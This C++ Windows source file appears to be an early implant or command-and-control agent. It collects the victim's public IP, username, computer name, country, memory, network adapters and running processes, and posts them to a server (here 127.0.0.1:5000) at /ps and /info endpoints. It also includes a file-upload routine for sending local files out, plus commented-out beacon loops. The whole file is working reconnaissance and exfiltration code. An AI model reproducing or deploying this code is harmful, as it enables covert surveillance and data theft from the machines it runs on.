#include<cctype>
#include<cmath>
#include<cstring>
#include<iostream>
#include <iomanip>
#include<Windows.h>
#include<WinInet.h>
#include <tchar.h>
#include <versionhelpers.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
using namespace std;

#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))



BOOL DoUploadFile(char* pszFilePath, char* pszFileName)
{
	LPCSTR boundary = "-----------------------------1234567890123"; 
	LPCSTR aboundary = "-----------------------------1234567890123";

	HINTERNET hSession = InternetOpenA("HttpSendRequest", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); //Synchronous mode
	if (!hSession)
	{
		printf("Failed to open InternetOpen\n");
		return -1;
	}

	//Connect to an http service:
	HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);

	if (!hConnect)
	{
		printf("error InternetConnect\n");
		return -1;
	}

	//upload files 
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);

	if (!hRequest)
	{
		printf("Failed to open request handle: %lu\n", GetLastError());
		return FALSE;
	}

	HANDLE hFile = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("\nFailed to open local file %s.", pszFilePath);
		return FALSE;
	}
	DWORD dwFileSize = GetFileSize(hFile, 0);

	char content_type[128] = { 0 };
	sprintf_s(content_type, "Content-Type: multipart/form-data; boundary=%s", boundary);


	//LPCSTR referer = "Referer: http://127.0.0.1/CRMFiles";
	//LPCSTR accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	//LPCSTR accept_lan = "Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3";
	//LPCSTR accept_encoding = "Accept-Encoding: gzip, deflate";
	//LPCSTR user_agent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0";

	HttpAddRequestHeadersA(hRequest, content_type, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	/*
	HttpAddRequestHeadersA(hRequest, referer, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	HttpAddRequestHeadersA(hRequest, accept, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	HttpAddRequestHeadersA(hRequest, accept_lan, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	HttpAddRequestHeadersA(hRequest, accept_encoding, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
	*/

	char first_boundary[128] = { 0 };
	char delimiter[128] = { 0 };
	char end_boundary[128] = { 0 };
	sprintf_s(first_boundary, "--%s\r\n", aboundary);
	sprintf_s(delimiter, "\r\n--%s\r\n", aboundary);
	sprintf_s(end_boundary, "\r\n--%s--\r\n", aboundary);

	char content_dispos[128] = { 0 };
	if (strlen(pszFileName) > 0) {
		sprintf_s(content_dispos, "Content-Disposition: form-data; name=\"fileupload\"; filename=\"%s\"\r\n", pszFileName);
		//_stprintf_s(content_dispos, "Content-Disposition: form-data; name=\"fileupload\"; filename=\"%s\"\r\n", pszFileName);
	}
	LPCSTR content_type2 = "Content-Type: application/octet-stream\r\n\r\n";
	LPCSTR rn = "\r\n";

	
	INTERNET_BUFFERSA BufferIn = { 0 };
	BufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	BufferIn.Next = NULL;
	BufferIn.lpcszHeader = NULL;
	BufferIn.dwHeadersLength = 0;
	BufferIn.dwHeadersTotal = 0;
	BufferIn.lpvBuffer = NULL;
	BufferIn.dwBufferLength = 0;
	BufferIn.dwBufferTotal = dwFileSize + strlen(first_boundary) + strlen(content_dispos) + strlen(content_type2) + strlen(end_boundary); //Content-Length:
	BufferIn.dwOffsetLow = 0;
	BufferIn.dwOffsetHigh = 0;

	if (!HttpSendRequestExA(hRequest, &BufferIn, NULL, 0, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		printf("Error on HttpSendRequestEx %lu\n", GetLastError());
		return FALSE;
	}


	DWORD dwWrittenBytes = 0;
	InternetWriteFile(hRequest, (byte*)first_boundary, strlen(first_boundary), &dwWrittenBytes); //first boundary
	InternetWriteFile(hRequest, (byte*)content_dispos, strlen(content_dispos), &dwWrittenBytes);
	InternetWriteFile(hRequest, (byte*)content_type2, strlen(content_type2), &dwWrittenBytes);

	DWORD sum = 0;
	DWORD dwBytesRead = 0;
	DWORD dwBytesWritten = 0;
	BYTE pBuffer[5120] = { 0 }; // Read the file at 5kb (the size of the stack is 1M, over 1M will prompt overflow)
	BOOL bRead, bRet;

	do
	{
		if (!(bRead = ReadFile(hFile, pBuffer, sizeof(pBuffer), &dwBytesRead, NULL)))
		{
			printf("\nReadFile failed on buffer %lu.", GetLastError());
			break;
		}
		if (!(bRet = InternetWriteFile(hRequest, pBuffer, dwBytesRead, &dwBytesWritten)))
		{
			printf("\nInternetWriteFile failed %lu", GetLastError());
			break;
		}
		sum += dwBytesWritten;
	} while (dwBytesRead == sizeof(pBuffer));
	CloseHandle(hFile);

	InternetWriteFile(hRequest, (byte*)end_boundary, strlen(end_boundary), &dwWrittenBytes);
	printf("Actual written bytes: %d\nupload %s successed!\n", sum, pszFileName);

	if (!HttpEndRequestA(hRequest, NULL, 0, 0))
	{
		printf("Error on HttpEndRequest %lu \n", GetLastError());
		return FALSE;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
	return TRUE;
}


// Takes in request handle, returns string based on response
std::string sendRequestGetResponse(HANDLE hRequest) {
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
	if (reqSuccess) {
		DWORD receivedData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
		{
			chunk.resize(receivedData);
			buf += chunk;
		}
		return buf;
	}
}

//Attempts to get public IP of user by reaching out to ifconfig.me
std::string getPublicIP(HANDLE hInternet) {
	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	std::string resp = sendRequestGetResponse(hRequest);
	if (hRequest)
		InternetCloseHandle(hRequest);
	if (hConnect)
		InternetCloseHandle(hConnect);
	return resp;
}


//Gets list of current running processes and converts to string
std::string getProcToStr() {
	std::string proclst;
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		wstring ws(procEntry.szExeFile);
		string str(ws.begin(), ws.end());
		proclst += str;
		proclst += ":";
		char buf[UNLEN + 1];
		DWORD len = UNLEN + 1;
		_itoa_s(procEntry.th32ProcessID, buf, 10);
		proclst += buf;
		proclst += "&";
	} while (Process32Next(hTH32, &procEntry));
	return proclst;
}


std::string getNetworkInfo() {
	int i;
	std::string nwInfo;
	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1)) {
					char buf[UNLEN + 1];
					_itoa_s((int)pAdapter->Address[i], buf, 16);
					if ((int)pAdapter->Address[i] < 0x10)
						nwInfo += "0";
					nwInfo += buf;
					nwInfo += ",";
					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
				}
				else {
					char buf[UNLEN + 1];
					_itoa_s((int)pAdapter->Address[i], buf, 16);
					if ((int)pAdapter->Address[i] < 0x10)
						nwInfo += "0";
					nwInfo += buf;
					nwInfo += "-";
					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
				}

			}
			nwInfo += pAdapter->IpAddressList.IpAddress.String;
			nwInfo += ",";
			pAdapter = pAdapter->Next;
		}
	}
	else {
		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
	return nwInfo;
}

//Gathers all info from devices and converts to string
//Currently includes: public IP, username, computer name, geolocation, memory amount, IP/MAC addresses
std::string gatherInfo(HANDLE hInternet) {
	std::string allInfo;
	allInfo += getPublicIP(hInternet);
	allInfo += "&";

	UINT i;
	char username[UNLEN + 1];
	DWORD len = UNLEN + 1;

	BOOL getUserSuccess = GetUserNameA(username, &len);
	if (getUserSuccess) {
		cout << username << "\n";
		allInfo += username;
		allInfo += "&";
	}
	else {
		cout << "unsuccessful" << "\n";
	}

	char computername[UNLEN + 1];
	DWORD len2 = UNLEN + 1;

	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
	if (getComputerNameSuccess) {
		cout << computername << "\n";
		allInfo += computername;
		allInfo += "&";
	}
	else {
		cout << "unsuccessful" << "\n";
	}

	GEOID g = GetUserGeoID(GEOCLASS_NATION);
	char iso2[UNLEN + 1];
	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
	cout << g << " " << iso2 << "\n";
	allInfo += iso2;
	allInfo += "&";

	ULONGLONG memqty = 0;
	GetPhysicallyInstalledSystemMemory(&memqty);
	char memqtystr[UNLEN + 1];
	_ui64toa_s(memqty, memqtystr, UNLEN, 10);
	allInfo += memqtystr;
	allInfo += "&";
	allInfo += getNetworkInfo();
	return allInfo;
}



//
int main() {
	const char* IP = "127.0.0.1";
	const int PORT = 5000;
	const int SLEEPTIME = 1001;

	char pth[UNLEN + 1];
	char fnm[UNLEN + 1];
	strcpy_s(pth, "C:\\Users\\shell\\Desktop\\funtime\\SecLists\\Passwords\\xato-net-10-million-passwords.txt");
	strcpy_s(fnm, "xato-net-10-million-passwords.txt");
	/*BOOL bOkey = DoUploadFile(pth, fnm);
	if (!bOkey)
	{
		printf("error DoUploadFile\n");
	}
	*/




	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);


	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);


	//Sends Process List to Server
	std::string procInfo = getProcToStr();
	int procInfoSize = procInfo.length();
	char* procInfoAsciiBuf = new char[procInfoSize + 1];
	strcpy_s(procInfoAsciiBuf, procInfoSize + 1, procInfo.c_str());
	cout << procInfoAsciiBuf << "\n";
	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	HttpSendRequestA(hRequestPS, NULL, NULL, procInfoAsciiBuf, procInfoSize);


	/*
	while (true) {
		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
		cout << sendRequestGetResponse(hRequest) << "\n";
		HttpEndRequestA(hRequest, NULL, NULL, NULL);
		Sleep(SLEEPTIME);
	}
	*/
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
	UINT i = 0;
	
	/*
	while (i < 1) {
		
		reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
		if (reqSuccess) {
			cout << "success" << "\n";
			DWORD receivedData = 0;
			DWORD chunkSize = 2048;
			std::string buf;
			std::string chunk(chunkSize, 0);
			while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
			{
				chunk.resize(receivedData);
				buf += chunk;
			}
			cout << buf << std::endl;
		
		}
		Sleep(SLEEPTIME);
		i++;
	}
	*/
	


	

	std::string allInfo = gatherInfo(hInternet);
	int sze = allInfo.length();
	char* ai = new char[allInfo.length() + 1];
	strcpy_s(ai, sze + 1, allInfo.c_str());
	cout << ai << "\n";

	HANDLE hRequest2 = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, ai, sze);
	if(reqSuccess2){
		cout << "suq" << "\n";
	}
	else {
		cout << GetLastError();
	}

	


	return 0;
}